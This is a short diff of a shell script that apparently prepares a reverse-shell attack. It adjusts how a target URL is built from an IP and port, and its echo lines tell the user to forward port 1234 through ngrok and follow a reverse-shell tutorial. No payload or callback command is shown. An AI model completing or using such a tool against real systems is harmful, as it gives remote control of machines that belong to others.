@@ -16,10 +16,9 @@ then
     echo $0" <ip> <port>"
     exit 1
 else
-    URL=$1':'$2
+    URL='http://'$1':'$2
 fi
 
-# Jar of Pickles
 echo "Step 1: Forward your 1234 port using ngrok."
 echo "Use the instructions from here: https://securiumsolutions.com/blog/reverse-shell-using-tcp/"
 echo "Press any key to continue if you've done this."
